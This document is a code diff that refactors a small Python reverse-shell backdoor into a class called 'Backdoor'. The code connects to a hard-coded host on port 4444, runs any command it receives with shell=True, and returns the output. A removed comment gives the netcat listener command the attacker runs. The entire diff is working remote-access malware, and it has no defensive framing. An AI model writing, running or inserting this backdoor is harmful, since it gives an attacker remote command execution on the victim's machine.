@@ -2,21 +2,24 @@
 import socket
 import subprocess
 
-def execute(cmd):
-    return subprocess.check_output(cmd, shell=True)
+class Backdoor:
+    def __init__(self, ip, p):
+        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.s.connect((ip, p))
 
-s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("192.168.1.17", 4444))
+    def execute(self, cmd):
+        return subprocess.check_output(cmd, shell=True)
 
-while True:
-    cmd = s.recv(1024)
-    try:
-        output = execute(cmd.decode("utf-8"))
-    except:
-        output = execute(str(cmd))
-    s.send(output)
-s.close()
-'''
-In 192.168.1.17 we listen for incoming connections using netcat
->nc -vv -l -p 4444
-'''
+    def start(self):
+        while True:
+            cmd = self.s.recv(1024)
+            try:
+                output = self.execute(cmd.decode("utf-8"))
+            except:
+                output = self.execute(str(cmd))
+            self.s.send(output)
+        self.s.close()
+
+
+talk = Backdoor("192.168.1.17", 4444)
+talk.start()
